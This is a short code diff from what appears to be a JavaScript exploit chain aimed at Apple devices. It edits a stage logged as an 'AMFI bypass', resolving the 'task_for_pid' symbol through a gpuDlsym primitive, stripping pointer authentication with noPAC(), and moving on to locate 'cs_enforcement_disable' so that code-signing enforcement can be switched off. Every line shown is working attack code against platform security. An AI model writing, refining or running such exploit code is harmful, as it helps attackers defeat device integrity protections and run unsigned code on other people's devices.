@@ -7706,7 +7706,9 @@
     LOG("[A2] Starting AMFI bypass (before pe_main dispatch)...");
     let a2_inside_success = false;
     let a2_sb_port = 0n;
-    let tfp_sym = tfp_raw_local.noPAC();
+    let a2_tfp_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "task_for_pid");
+    LOG(`[A2] gpuDlsym(task_for_pid) = ${a2_tfp_raw.hex()}`);
+    let tfp_sym = a2_tfp_raw.noPAC();
     if (tfp_sym != 0n) {
       // Approach 1: cs_enforcement_disable
       let csed_addr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "cs_enforcement_disable");
